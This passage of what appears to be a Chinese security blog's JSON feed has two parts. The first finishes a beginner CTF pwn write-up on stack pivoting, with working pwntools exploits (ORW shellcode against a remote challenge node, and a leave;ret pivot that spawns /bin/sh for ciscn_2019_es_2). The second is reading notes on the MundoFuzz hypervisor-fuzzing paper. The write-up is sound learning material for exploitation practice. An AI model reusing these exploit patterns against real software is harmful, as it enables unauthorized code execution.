class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;xxx&quot;,xxx)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">29945</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh = process(&quot;./bad&quot;)</span></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x000400A3E&quot;)</span></span><br><span class=\"line\">context.arch= <span class=\"string\">&#x27;x86_64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">vulnaddr = <span class=\"number\">0x0400A1E</span></span><br><span class=\"line\"></span><br><span class=\"line\">bssaddr = <span class=\"number\">0x006010Aa</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># mov rdi,buxingma3</span></span><br><span class=\"line\">orw_shellcode = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">mov rax,0x67616c662f</span></span><br><span class=\"line\"><span class=\"string\">push rax</span></span><br><span class=\"line\"><span class=\"string\">mov rdi,rsp</span></span><br><span class=\"line\"><span class=\"string\">xor rsi,rsi</span></span><br><span class=\"line\"><span class=\"string\">mov rax,0x2</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi,rax</span></span><br><span class=\"line\"><span class=\"string\">mov rsi,0x6010aa</span></span><br><span class=\"line\"><span class=\"string\">mov rdx,0x100</span></span><br><span class=\"line\"><span class=\"string\">xor rax,rax</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi,1</span></span><br><span class=\"line\"><span class=\"string\">mov rsi,0x6010aa</span></span><br><span class=\"line\"><span class=\"string\">mov rdx,0x100</span></span><br><span class=\"line\"><span class=\"string\">mov rax,1</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">hlt</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">read_shellcode = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">mov rdi,0</span></span><br><span class=\"line\"><span class=\"string\">mov rsi,0x123000</span></span><br><span class=\"line\"><span class=\"string\">mov rdx,0x1000</span></span><br><span class=\"line\"><span class=\"string\">xor rax,rax</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">jmp rsi</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">jmp_rsp = <span class=\"number\">0x00000400a01</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这几个payload都可以,本质都一样</span></span><br><span class=\"line\">payload = asm(read_shellcode).ljust(<span class=\"number\">32</span>,<span class=\"string\">b&quot;\\x00&quot;</span>) + p64(<span class=\"number\">0</span>) + p64(jmp_rsp) + <span class=\"string\">b&#x27;\\xE8\\xcb\\xff\\xff\\xff&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = asm(read_shellcode).ljust(32,b&quot;\\x00&quot;) + p64(0) + p64(jmp_rsp)+asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#payload = asm(read_shellcode).ljust(32,b&quot;\\x00&quot;) + p64(0) + p64(jmp_rsp) + b&#x27;\\xE8\\xcb\\xff\\xff\\xff&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh.send(payload)</span></span><br><span class=\"line\"><span class=\"comment\">#sh.send(asm(orw_shellcode))</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;Easy shellcode, have fun!&#x27;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;Baddd! Focu5 me! Baddd! Baddd!&#x27;</span>,asm(orw_shellcode))</span><br><span class=\"line\">sh.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"知识点总结\"><a href=\"#知识点总结\" class=\"headerlink\" title=\"知识点总结\"></a>知识点总结</h1><p>orw的shellcode编写</p>\n<h3 id=\"栈迁移-jmp-rsp-、及jmp-转移指令的含义\"><a href=\"#栈迁移-jmp-rsp-、及jmp-转移指令的含义\" class=\"headerlink\" title=\"栈迁移 jmp rsp 、及jmp 转移指令的含义\"></a>栈迁移 jmp rsp 、及jmp 转移指令的含义</h3><p>#payload &#x3D; asm(read_shellcode).ljust(32,b”\\x00”) + p64(0) + p64(jmp_rsp)+asm(‘sub rsp,0x30;jmp rsp’)</p>\n<h3 id=\"近转移call的含义\"><a href=\"#近转移call的含义\" class=\"headerlink\" title=\"近转移call的含义\"></a>近转移call的含义</h3><p>payload &#x3D; asm(read_shellcode).ljust(32,b”\\x00”) + p64(0) + p64(jmp_rsp) + b’\\xE8\\xcb\\xff\\xff\\xff’</p>\n<p>​\te8是 call的操作码 <em>#call 硬编码E8，后面加上四个字节的偏移(目标指令 - 下一条指令地址)</em></p>\n<p>hex(0xffffffcb - 0xffffffff) &#x3D; - 0x34</p>\n<p>那7f不会影响它吗?</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410142020849.png\" alt=\"image-20230410142020849\" style=\"zoom: 33%;\">\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410143448769.png\" alt=\"image-20230410143448769\" style=\"zoom:50%;\">\n\n<h2 id=\"疑问\"><a href=\"#疑问\" class=\"headerlink\" title=\"疑问\"></a>疑问</h2><p>下断点断不下来,直接跳到后面read之后了</p>\n<p>近转移call的含义</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/qq_34010404/article/details/123809796\">https://blog.csdn.net/qq_34010404/article/details/123809796</a></p>\n<p><a href=\"https://blog.csdn.net/mcmuyanga/article/details/113389703\">https://blog.csdn.net/mcmuyanga/article/details/113389703</a></p>\n<h1 id=\"3-ciscn-2019-es-2\"><a href=\"#3-ciscn-2019-es-2\" class=\"headerlink\" title=\"3.ciscn_2019_es_2\"></a>3.ciscn_2019_es_2</h1><p>Ubuntu 18   2.27 32位</p>\n<h2 id=\"分析反编译代码及保护-1\"><a href=\"#分析反编译代码及保护-1\" class=\"headerlink\" title=\"分析反编译代码及保护\"></a>分析反编译代码及保护</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/stackpivot/ciscn_2019_es_2/ciscn_2019_es_2&#x27;</span></span><br><span class=\"line\">    Arch:     i386-<span class=\"number\">32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x8046000</span>)</span><br><span class=\"line\">    RUNPATH:  <span class=\"string\">b&#x27;/home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"built_in\">int</span> __cdecl main(<span class=\"built_in\">int</span> argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  init();</span><br><span class=\"line\">  puts(<span class=\"string\">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class=\"line\">  vul();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> vul()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s; // [esp+0h] [ebp-28h]</span><br><span class=\"line\"></span><br><span class=\"line\">  memset(&amp;s, <span class=\"number\">0</span>, 0x20u);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, 0x30u);</span><br><span class=\"line\">  printf(<span class=\"string\">&quot;Hello, %s\\\\n&quot;</span>, &amp;s);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, 0x30u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> printf(<span class=\"string\">&quot;Hello, %s\\\\n&quot;</span>, &amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能看到存在明显的栈溢出,而且是两次,<font color=\"red\">但是溢出的字节有限,只能覆盖个ebp和返回地址</font>,栈的大小是0x28, 后面4字节ebp,4字节返回地址, 正好0x30,也就是读取输入的大小</p>\n<p>​\t\t利用00截断的bug,可以让printf一直输出,memset设置了0x20个0,给覆盖掉即可,这样的话,第一次输出就可以得到栈的地址,然后通过覆盖返回地址为leave;ret;(加上函数本身就有一次leave;ret;), 两次leave;ret;就把esp迁移到栈的缓冲区上,就可以执行第二次输入的payload了</p>\n<h2 id=\"找缓冲区位置\"><a href=\"#找缓冲区位置\" class=\"headerlink\" title=\"找缓冲区位置\"></a>找缓冲区位置</h2><p>​\t\tpwndbg&gt; ni Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccc</p>\n<p>​\t\t输出的话,会从ecx(缓冲区开始的地方),一直往下输出,</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410115230094.png\" alt=\"image-20230410115230094\"></p>\n<p>​\t\t所以0x28之后的就是ebp了,ebp和ecx的差了0x28个字节,所以ebp-0x28就是ecx</p>\n<p>​\t\t<font color=\"red\">这种思路不对, 因为输出的是ebp这个地址存的值,而不是ebp本身的值</font>,这个值,是ebp的地址加0x10</p>\n<p>​\t\t所以ecx的地址应当是接收到的ebp存储的值-0x28-0x10 所以就是ebp-0x38</p>\n<h2 id=\"栈迁移-1\"><a href=\"#栈迁移-1\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h2><p>​\t\t可以把ebp伪造成ecx的地址, 然后返回地址leave;ret; (再加上本身函数就有一个leave;ret;) 这样两次就可以修改esp,改变程序控制流, 回去打system(”&#x2F;bin&#x2F;sh”)</p>\n<h2 id=\"system-getshell\"><a href=\"#system-getshell\" class=\"headerlink\" title=\"system getshell\"></a>system getshell</h2><p>​\t\tsystem的话 用plt表的0x804A018 ,got表不行吗?</p>\n<p>​\t\tplt的顺序到底是啥…先plt还是先got, 还是说因为plt就是跳到got,所以直接引用got也可以</p>\n<p>​\t\tp32(system_addr) + p32(0) + p32(”&#x2F;bin&#x2F;sh”) <font color=\"red\">这个是错误的,为什么呢??? 为什么直接用值不行呢??</font></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410123536836.png\" alt=\"image-20230410123536836\" style=\"zoom: 33%;\">\n\n<p>​\t\t应该是payload &#x3D; p32(callsystem)+p32(0)+p32(ecx_addr+12)+b”&#x2F;bin&#x2F;sh”</p>\n<p>​\t\t直接binsh字符串是不行的,需要一个指向这个字符串的地址,所以用的这个,记得后面要加\\x00作为结束符号</p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;node4.buuoj.cn&quot;,29945)</span></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b _start&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch= &#x27;x86_64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x20</span> + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">8</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;name?&#x27;</span>,payload)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;bbbbbbbb&quot;</span>)</span><br><span class=\"line\">ecx_addr = u32(sh.recv(<span class=\"number\">4</span>)) - <span class=\"number\">0x38</span></span><br><span class=\"line\"></span><br><span class=\"line\">callsystem = <span class=\"number\">0x8048400</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x080484b8</span></span><br><span class=\"line\">payload = p32(callsystem) + p32(<span class=\"number\">0</span>) + p32(ecx_addr+<span class=\"number\">12</span>)+<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = p32(callsystem) + p32(leave_ret) + b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\">payload  = payload.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">payload += p32(ecx_addr-<span class=\"number\">4</span>)+p32(leave_ret)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"做题思路及知识点\"><a href=\"#做题思路及知识点\" class=\"headerlink\" title=\"做题思路及知识点\"></a>做题思路及知识点</h2><p>1.可以明确这题本身不能往bss写的,没有途径,只能往栈上写</p>\n<p>2.本身栈里存的是0? 怎么知道   memset那里设置了</p>\n<p>3.read结束之后不会在末尾加上’\\x00’，而printf不遇到’\\x00’就不会停止打印，  这个知识点怎么来的呢???? 前面的memset提示??  或许可以是一个知识储备,这个好像是一个常用的点</p>\n<p>4.假的后门函数,这个是echo 字符串flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0804854B hack            proc near</span><br><span class=\"line\">.text:0804854B ; __unwind &#123;</span><br><span class=\"line\">.text:0804854B                 push    ebp</span><br><span class=\"line\">.text:0804854C                 mov     ebp, esp</span><br><span class=\"line\">.text:0804854E                 sub     esp, <span class=\"number\">8</span></span><br><span class=\"line\">.text:08048551                 sub     esp, 0Ch</span><br><span class=\"line\">.text:08048554                 push    offset command  ; <span class=\"string\">&quot;echo flag&quot;</span></span><br><span class=\"line\">.text:08048559                 call    _system</span><br><span class=\"line\">.text:0804855E                 add     esp, 10h</span><br><span class=\"line\">.text:08048561                 nop</span><br><span class=\"line\">.text:08048562                 leave</span><br><span class=\"line\">.text:08048563                 retn</span><br><span class=\"line\">.text:08048563 ; &#125; // starts at 804854B</span><br><span class=\"line\">.text:08048563 hack            endp</span><br></pre></td></tr></table></figure>\n\n\n\n<p>计算机基础不是很牢固…所以有些细节理解不到..</p>\n<h2 id=\"留下的疑问\"><a href=\"#留下的疑问\" class=\"headerlink\" title=\"留下的疑问\"></a>留下的疑问</h2><p>​\t\tsystem的话 用plt表的0x804A018 ,got表不行吗?</p>\n<p>​\t\tplt的顺序到底是啥…先plt还是先got, 还是说因为plt就是跳到got,所以直接引用got也可以</p>\n<h1 id=\"参考-1\"><a href=\"#参考-1\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/qq_34010404/article/details/123809796\">https://blog.csdn.net/qq_34010404/article/details/123809796</a></p>\n<p><a href=\"https://blog.csdn.net/mcmuyanga/article/details/113389703\">https://blog.csdn.net/mcmuyanga/article/details/113389703</a></p>\n<p><a href=\"https://blog.csdn.net/qq_45691294/article/details/112196127\">https://blog.csdn.net/qq_45691294/article/details/112196127</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41696518/article/details/126665825\">https://blog.csdn.net/qq_41696518/article/details/126665825</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41202237/article/details/105913597\">https://blog.csdn.net/qq_41202237/article/details/105913597</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12189\">https://xz.aliyun.com/t/12189</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/",
            "url": "https://tangzichengcc.github.io/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/",
            "title": "论文阅读笔记1-USENIX-MundoFuzz_Hypervisor_Fuzzing",
            "date_published": "2023-04-07T02:06:49.000Z",
            "content_html": "<p>​\t\t虚拟化安全的pre,其实是自己第一次讲顶会论文…觉得一篇论文的工作量和细节还是蛮大的,也学到了挺多,在之后应该多读和多分析论文. 这篇文章是设计了一个fuzz工具,针对hypervisor,改进了fuzz中常用的两种方法,并且设计出了一套从开始收集数据,数据处理到后面fuzz的系统,在代码覆盖率方面比现有最好的hypervisor工具提高了5%左右,并且发现了40个bug,其中qemu通过了9个cve,其余还在申请中..</p>\n<p>​\t\tPS: 感觉工作量真的大…分析一篇都要很久,而且还没有太深入..更何况要去做(太菜了太菜了)</p>\n<p>​\t\t论文链接: <a href=\"https://www.usenix.org/conference/usenixsecurity22/presentation/myung\">https://www.usenix.org/conference/usenixsecurity22/presentation/myung</a></p>\n<p>​\t\t有作者的演讲视频和ppt,可以看一下</p>\n<h1 id=\"一-Introduction\"><a href=\"#一-Introduction\" class=\"headerlink\" title=\"一. Introduction\"></a>一. Introduction</h1><p>这部分可以详细读一下,介绍了本文的大背景,现有的一些研究的不足,本文的主要贡献等.</p>\n<h1 id=\"二-背景知识\"><a href=\"#二-背景知识\" class=\"headerlink\" title=\"二. 背景知识\"></a>二. 背景知识</h1><h2 id=\"2-1-hypervisor的外设输入空间\"><a href=\"#2-1-hypervisor的外设输入空间\" class=\"headerlink\" title=\"2.1 hypervisor的外设输入空间\"></a>2.1 hypervisor的外设输入空间</h2><p>​\t\t本文是针对hypervisor的外设部分进行fuzz,外设很好理解,就是虚拟出来的,比如鼠标键盘,硬盘,驱动等,这些物理外设,与之交互的话,都有一些特殊的协议和格式.</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407100945738.png\" alt=\"image-20230407100945738\"></p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407100858110.png\" alt=\"image-20230407100858110\"></p>\n<p>​\t\t因为是虚拟出来的,和真实的设备不一样,所以不能直接访问,需要通过其他方法,常用的有三种</p>\n<p>​\t\tPIO（Programmed Input&#x2F;Output）是一种最基本的输入&#x2F;输出（I&#x2F;O）通道，它将设备寄存器映射到一个独立的地址空间。这个地址空间只能通过特殊指令（in&#x2F;out）访问。PIO的优点是简单，但它的局限是设备寄存器只能通过专用指令进行访问，这会带来一些限制。</p>\n<p>​\t\tMMIO（Memory-Mapped Input&#x2F;Output）则将设备寄存器映射到内存地址的一个地址范围内，使得设备寄存器可以通过内存操作（例如加载或存储）访问。MMIO的优点是简化了设备访问的编程接口，但它的缺点是需要占用一部分内存地址空间。</p>\n<p>​\t\tDMA（Direct Memory Access）是一种直接内存访问技术，允许设备直接访问主机内存，而不需要CPU的干预。在DMA中，操作系统内核首先分配一块共享内存缓冲区，并将其地址告知虚拟设备。然后虚拟设备可以直接访问这个缓冲区以接收或返回数据。DMA的优点是可以减少CPU的开销，但它也需要特殊的硬件支持和一些额外的管理开销来确保安全和保护内存的一致性。</p>\n<h3 id=\"完成信号\"><a href=\"#完成信号\" class=\"headerlink\" title=\"完成信号\"></a>完成信号</h3><p>​\t\t虚拟设备通过io操作完成任务退回到空闲状态时,通过发送信号通知vm实例 可以通过硬件中断或专用设备寄存器来实现.介绍这个是因为在后面要捕获io交互的操作,可以通过这个信号判定一个操作结束.</p>\n<h2 id=\"2-1-fuzz\"><a href=\"#2-1-fuzz\" class=\"headerlink\" title=\"2.1 fuzz\"></a>2.1 fuzz</h2><p>​\t\tfuzz是一种常用的软件发现的方法.</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407100815405.png\" alt=\"image-20230407100815405\"></p>\n<h2 id=\"2-2-现有研究不足\"><a href=\"#2-2-现有研究不足\" class=\"headerlink\" title=\"2.2 现有研究不足\"></a>2.2 现有研究不足</h2><p>​\t\t覆盖引导:  VDF手动进行排除噪音, 并且要把外设单独提取进行测试   </p>\n<p>​\t\t基于语法:  NYX 手动编写语法规则   </p>\n<p>​\t\t都未能实现自动化,需要耗费大量人力</p>\n<h1 id=\"三-Hypervisor-Fuzzing所面临的挑战\"><a href=\"#三-Hypervisor-Fuzzing所面临的挑战\" class=\"headerlink\" title=\"三. Hypervisor Fuzzing所面临的挑战\"></a>三. <strong>Hypervisor Fuzzing所</strong>面临的挑战</h1><p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled.png\" alt=\"Untitled\"></p>\n<h2 id=\"3-1-覆盖测量中的噪声-影响覆盖引导型测试\"><a href=\"#3-1-覆盖测量中的噪声-影响覆盖引导型测试\" class=\"headerlink\" title=\"3.1 覆盖测量中的噪声-影响覆盖引导型测试\"></a>3.1 覆盖测量中的噪声-影响覆盖引导型测试</h2><p>​\t\t为什么会有噪声? 与它的固有属性有关,它是虚拟机管理程序,要虚拟化整个机器资源,所以它负责处理各种异步事件,尤其是终端和定时器事件,而这些事件和特定输入无关,就会导致输入混杂着噪音,从而输出也不一致.</p>\n<p>​\t\t假定是固定的输入能够得到固定的输出,这样的话才能够精确地去测量代码覆盖率等,噪声会严重影响测量.</p>\n<h2 id=\"3-2-解决方案\"><a href=\"#3-2-解决方案\" class=\"headerlink\" title=\"3.2 解决方案\"></a>3.2 解决方案</h2><p>​\t\t噪声不一定会在哪些代码分支里,但总应该是有不同的,取一个合适的测量次数值N,把所有测量结果取交集,就可以筛掉噪音.</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled1.png\" alt=\"Untitled\"></p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled2.png\" alt=\"Untitled\"></p>\n<h3 id=\"3-2-1-测量单条io指令所引起的代码覆盖变化\"><a href=\"#3-2-1-测量单条io指令所引起的代码覆盖变化\" class=\"headerlink\" title=\"3.2.1 测量单条io指令所引起的代码覆盖变化\"></a>3.2.1 测量单条io指令所引起的代码覆盖变化</h3><p>​\t\t单条io指令执行后的结果其实是包含了它之前的所有指令的结果(包含一些必要的初始化操作),所以取两个完全一样的机器运行,左边的输入比右边多一条要测量代码覆盖变化的指令,这样左边的代码覆盖减去右边的代码覆盖,就得到了这一条指令的代码覆盖范围.</p>\n<p>​\t\t但还是有噪音的,通过之前所述的方法进行消除噪音即可.</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407101640642.png\" alt=\"image-20230407101640642\"></p>\n<h2 id=\"3-3-复杂的语义输入-影响语法感知型测试\"><a href=\"#3-3-复杂的语义输入-影响语法感知型测试\" class=\"headerlink\" title=\"3.3 复杂的语义输入-影响语法感知型测试\"></a>3.3 复杂的语义输入-影响语法感知型测试</h2><p>​\t\t语义分了两种,一种是寄存器语义,如何识别控制寄存器和数据寄存器以及DMA寄存器,另外一种是依赖关系,操作是有前后的顺序的,比如先要找到扇区,再进行写入,这是逻辑依赖,还有一种是操作依赖,例如DMA,先要配置DMA的地址,然后再进行写入.</p>\n<p>​\t\t</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407102024732.png\" alt=\"image-20230407102024732\"></p>\n<h3 id=\"3-3-1-设备寄存器的语义\"><a href=\"#3-3-1-设备寄存器的语义\" class=\"headerlink\" title=\"3.3.1 设备寄存器的语义\"></a>3.3.1 设备寄存器的语义</h3><p>分了三类</p>\n<p>1.控制寄存器</p>\n<p>通过传递控制值来表明是需要哪个函数或操作指令</p>\n<p>2.数据寄存器</p>\n<p>传递参数等</p>\n<p>3.DMA地址寄存器</p>\n<p>传递DMA缓冲区的基地址</p>\n<p>​\t\tDMA地址寄存器可以直接进行识别,因为一开始就可以获取操作系统分配的DMA地址,只要检测是否在这个地址范围内,就可以确定是否是DMA寄存器</p>\n<p>​\t\t困难的是控制寄存器和数据寄存器的识别,如下图,不同的控制寄存器的值相当于调用不同的函数,数据寄存器也就是值</p>\n<img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled 3.png\" alt=\"Untitled\" style=\"zoom:25%;\">\n\n<img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled 4.png\" alt=\"Untitled\" style=\"zoom:25%;\">\n\n<img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled 5.png\" alt=\"Untitled\" style=\"zoom:50%;\">\n\n<h3 id=\"3-3-2-解决方案\"><a href=\"#3-3-2-解决方案\" class=\"headerlink\" title=\"3.3.2 解决方案\"></a>3.3.2 